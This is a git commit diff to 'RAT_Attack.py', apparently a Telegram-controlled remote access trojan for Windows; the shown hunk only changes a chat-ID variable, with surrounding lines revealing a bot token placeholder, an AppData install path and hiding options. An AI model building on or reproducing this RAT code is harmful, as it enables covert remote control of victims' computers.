af6e7a485a5083e484f6c16c412a032f61f05b6a
PulkitSingh256 <psinghania256@gmail.com>
2018-01-29 22:37:37 +0530

    Update RAT_Attack.py

--- RAT_Attack.py
+++ RAT_Attack.py
@@ -31,7 +31,7 @@ token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll' #(Token Here)
 # This will be used for setting paths and related file io -- change to whatever you want
 app_name = 'Portal'
 # ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
-known_ids = [] #( CHAT-ID Here )
+known_ids = '' #( CHAT-ID Here )
 #known_ids.append(os.environ['TELEGRAM_CHAT_ID']) 		# make sure to remove this line if you don't have this environment variable
 appdata_roaming_folder = os.environ['APPDATA']			# = 'C:\Users\Username\AppData\Roaming'
 														# HIDING OPTIONS
